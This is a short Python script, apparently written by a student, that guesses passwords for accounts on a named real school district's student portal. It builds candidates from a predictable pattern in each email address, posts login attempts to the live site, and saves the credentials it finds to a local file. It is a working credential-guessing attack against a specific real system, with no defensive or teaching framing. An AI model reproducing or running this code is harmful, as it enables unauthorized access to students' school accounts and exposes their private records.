import requests
import time as t

while True:
    email = input("Please input the email mr hackerman \n")
    passw1 = email[0] + email[4] + "414"
    number = len(email)
    number2 = number - 2
    url = "https://focus.hardee.k12.fl.us/focus/index.php"
    login = "true"
    right = False
    f = open("un&pw.txt", "r")
    yeet = f.read()
    f.close()
    if email in yeet:
        startnum = yeet.find(email)
        print("You already have it!! It is - \n")
        print(yeet[startnum:startnum + 17] + "\n")
        right = True
        
    else:
        print("You do not currently have it, will add the password and store it.")
    for i in range (0,6):
        if right == False:
            data = "username=" + email + "&password=" + passw1 + str(i) + str(email[number2]) + str(email[number2 + 1])
            payload = {"login":login, "data":data}
            with requests.Session() as s:
                r = requests.post(url, payload)
                if '{"success":true' in r.text:
                    print("\n Login was successful \n")
                    print(passw1 + str(i) + str(email[number2]) + str(email[number2 + 1]) + "\n")
                    right = True
                    f = open("un&pw.txt", "w")
                    f.write(yeet + "\n" + email + ":" + passw1 + str(i) + str(email[number2]) + str(email[number2 + 1]))
                    f.close()
                    print("\nAdded new email - " + email + ":" + passw1 + str(i) + str(email[number2]) + str(email[number2 + 1]))

                if i >= 5:
                    print("\n password is " + passw1 + str(i) + str(email[number2]) + str(email[number2 + 1] + "\n"))
                    f = open("un&pw.txt", "w")
                    f.write(yeet + "\n" + email + ":" + passw1 + str(i) + str(email[number2]) + str(email[number2 + 1]))
                    f.close()
                    print("\nAdded new email - " + email + ":" + passw1 + str(i) + str(email[number2]) + str(email[number2 + 1]))
